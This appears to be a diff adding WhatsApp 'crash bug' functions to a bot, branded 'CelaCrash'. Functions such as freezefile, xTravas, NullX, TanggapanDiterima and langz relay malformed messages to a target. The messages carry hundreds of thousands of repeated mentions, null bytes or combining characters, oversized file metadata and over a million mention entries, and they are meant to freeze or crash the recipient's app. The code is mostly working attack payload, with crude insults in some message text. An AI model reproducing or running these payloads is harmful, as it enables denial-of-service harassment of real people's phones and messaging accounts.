+              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ𓍯̤𖣂  Cella - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6282332790754".repeat(27000)
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{}"
+            },
+            contextInfo: {
+              mentionedJid: ["6282332790754@s.whatsapp.net"],
+              forwardingScore: 1,
+              isForwarded: true,
+              fromMe: false,
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              quotedMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                  fileLength: "9999999999999",
+                  pageCount: 1316134911,
+                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
+                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1724474503",
+                  contactVcard: true,
+                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                  jpegThumbnail: ""
+                }
+              }
+            }
+          }
+        }
+      }
+    }, zLoc ? {
+      participant: {
+        jid: zLoc
+      }
+    } : {});
+    console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
+  }
+async function freezefile(zLoc, ptcp = false) {
+    let virtex = "🌸͜͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤🌿" + "@1".repeat(250000);
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "🌿͜͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤🌸",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: virtex
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+} 
+    
+async function xPokers(zLoc, ptcp = false) {
+    let virtex = ".⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤☠️" + "@6282291664759".repeat(25000);
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "🦠.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤☠️",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: virtex
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "6282291664759@s.whatsapp.ney"),
+                        groupMentions: [{ groupJid: "6282291664759@s.whatsapp.net", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+		
+async function xTravas(zLoc, ptcp = false) {
+    let virtex = "Cella";
+    let buttons = Array.from({ length: 200 }, () => ({
+        name: 'call_permission_request',
+        buttonParamsJson: '{}'
+    }));
+    let overJids = Array.from({ length: 1039900 }, () => zLoc);
+    
+    await sych.relayMessage(zLoc, {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: virtex,
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: virtex,
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: virtex
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xinn " }]
+                    }
+                }
+            }
+        },
+        contextInfo: {
+            mentionedJid: overJids,
+            externalAdReply: {
+                showAdAttribution: true,
+                renderLargerThumbnail: false,
+                title: `-> .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ `,
+                body: `—??`,
+                previewType: "VIDEO",
+                thumbnail: "",
+                sourceUrl: "https://byxzmods.com",
+                mediaUrl: "https://byxzmods.com"
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+
+
+async function Vulcanicx(zLoc, ptcp = false) {
+    let virtex = "Cela " + "ꦾ".repeat(40000);
+    await sych.relayMessage(zLoc, {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: virtex,
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: virtex,
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: virtex
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array(20).fill({
+                            name: 'call_permission_request',
+                            buttonParamsJson: '{}'
+                        })
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+        
+        
+async function NullX(zLoc, ptcp = false) {
+    await sych.relayMessage(zLoc, {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " Halo Bro ",
+                            format: "EXTENSIONS_1"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: 'galaxy_message',
+                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, 
+        ptcp ? { participant: { jid: zLoc } } : {}
+    );
+};
+async function bakdok(zLoc, ptcp = false) {
+ var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
+  "documentMessage": {
+    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+    "mimetype": "penis",
+    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+    "fileLength": "999999999",
+    "pageCount": 999999999,
+    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+    "fileName": `Cella DOCUMENT`+"ྦྷ".repeat(60000),
+    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+    "mediaKeyTimestamp": "1715880173"
+  }
+}), { userJid: zLoc, quoted: ptcp });
+await sych.relayMessage(target, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id });
+}
+async function CallMsg(zLoc, ptcp = false) {
+    await sych.relayMessage(zLoc, {
+                        "messageContextInfo": {
+                            "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
+                            "deviceListMetaData": {},
+                            "deviceListMetadataVersion": 2
+                        },
+                        "scheduledCallCreationMessage": {
+                            "scheduledTimestampMs": '1200',
+                            callType: "AUDIO",
+                            "title": ' # TrashDex - Explanation ' + '❗'.repeat(20000),
+                        }
+                    }, {
+                        additionalAttributes: {
+                            edit: '7'
+                        }
+                    })
+                }
+
+
+async function CaroUsel(zLoc, ptcp = false) {
+      let etc = generateWAMessageFromContent(
+        zLoc,
+        proto.Message.fromObject({
+          viewOnceMessage: {
+            message: {
+              interactiveMessage: {
+                header: {
+                  title: "",
+                  locationMessage: {},
+                  hasMediaAttachment: true,
+                },
+                body: {
+                  text: "⭑‌Cella Crash ‌",
+                },
+                nativeFlowMessage: {
+                  name: "call_permission_request",
+                  messageParamsJson: " ꦾ ",
+                },
+                carouselMessage: {},
+              },
+            },
+          },
+        }),
+        {
+          userJid: zLoc,
+          quoted: m
+        }
+      );
+
+      await sych.relayMessage(
+        zLoc,
+        etc.message,
+        ptcp
+          ? {
+              participant: {
+                jid: zLoc,
+              },
+            }
+          : {}
+      );
+      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
+    }
+    
+		async function TanggapanDiterima(zLoc, ptcp = false) {
+			await sych.relayMessage(zLoc, {
+					viewOnceMessage: {
+						message: {
+							interactiveResponseMessage: {
+								body: {
+									text: "CellaNuLL",
+									format: "EXTENSIONS_1"
+								},
+								nativeFlowResponseMessage: {
+									name: 'galaxy_message',
+									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+									version: 3
+								}
+							}
+						}
+					}
+				},
+				ptcp ? {
+					participant: {
+						jid: zLoc
+					}
+				} : {}
+			);
+			console.log(chalk.green("Cella Attacked Someone! 😴"));
+		};
 		
 		
+		
+		
+  async function uidoc(zLoc, ptcp = false) {
+    let uitext = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/pdf',
+                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
+                            fileName: "unidentifiedMessageType",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: uitext
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+
+
+
+    // Freeze Speciality //
+     async function locasiV2(zLoc, ptcp = false) {
+   let mark = '0@s.whatsapp.net';
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "Cella Bug" + "ꦾ".repeat(1099)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+
+async function locasifreeze(zLoc, ptcp = false) {
+    await sych.relayMessage(zLoc, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "Cela" + "@1".repeat(295000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: zLoc } }, { messageId: null });
+}
+
+
+async function langz(zLoc, ptcp = false) {
+    try {
+        // Membuat pesan dengan tombol di WhatsApp
+        const xp = generateWAMessageFromContent(zLoc, {
+            viewOnceMessage: {
+                message: {
+                    buttonsMessage: {
+                        buttons: [
+                            {
+                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
+                                buttonText: { displayText: "Kontol" },
+                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
+                            }
+                        ],
+                        contentText: "💀puki💀",
+                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
+                        text: "Dasar Kontol"
+                    }
+                }
+            }
+        }, { ephemeralExpiration: 5, timestamp: new Date() });
+
+        // Mengirim pesan dengan tombol
+        const x1 = await sych.relayMessage(zLoc, xp.message,  {
+					participant: {
+						jid: zLoc
+					}
+				});
+        // Menyiapkan pesan respons tombol
+        const od = await sych.relayMessage(zLoc, {
+            viewOnceMessage: {
+                message: {
+                    buttonsResponseMessage: {
+                        selectedButtonId: `${"\u0000".repeat(510000)}`, // Potensi crash uji coba
+                        selectedDisplayText: "Kontol",
+                        type: proto.Message.ButtonsResponseMessage.Type.DISPLAY_TEXT,
+                        contextInfo: {
+                            participant: zLoc,
+                            remoteJid: zLoc,
+                            stanzaId: x1,  // Menggunakan ID pesan sebelumnya
+                            quotedMessage: {
+                                viewOnceMessage: {
+                                    message: {
+                                        buttonsMessage: {
+                                            buttons: [
+                                                {
+                                                    buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
+                                                    buttonText: { displayText: "Kontol" },
+                                                    type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
+                                                }
+                                            ],
+                                            contentText: "💀puki💀",
+                                            headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
+                                            text: "Dasar Kontol"
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }, {
+					participant: {
+						jid: zLoc
+					}
+				});
+
+        console.log(od);
+
+        // Mengirim balasan jika perintah valid
+        await sych.sendMessage(zLoc, { text: "Dasar Kontol" }, { quoted: m });
+
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error);
+    }
+}
+
+
+
+async function documentfreeze(zLoc, ptcp = false) {
+
+let profile;
+try {
+    profile = await sych.profilePictureUrl(m.sender, 'image');
+} catch (e) {
+    profile = fake.anonim;
+}
+    
+    await sych.sendMessage(zLoc, {
+    document: fake.docs,
+    fileName: ucapanWaktu,
+    mimetype: pickRandom(fake.listfakedocs),
+    fileLength: '100000000000000',
+    pageCount: '999',
+    image: {
+        url: "./src/media/sych.png", // Pastikan file ini tersedia
+        gifPlayback: true
+    },
+    caption: `╭──❍ *BOT MENU* ❍──╮
+├ 📌 *${ucapanWaktu}*
+├ 🤖 *Bot Status:* 🟢 Active
+├ 👤 *Owner:* Galangz
+├ 🌐 *Website:* https://mataberita.com
+├ 📅 *Tanggal:* ${new Date().toLocaleDateString()}
+╰──❍ *Powered by Galangz* ❍──╯
+
+📍 *Gunakan tombol di bawah ini untuk memilih menu!*`,
+    
+    contextInfo: {
+        forwardingScore: 999,
+        isForwarded: true,
+        externalAdReply: {
+            title: "Bot Status",
+            body: "🟢 Active",
+            thumbnailUrl: profile,
+            mediaType: 1,
+            renderLargerThumbnail: true,
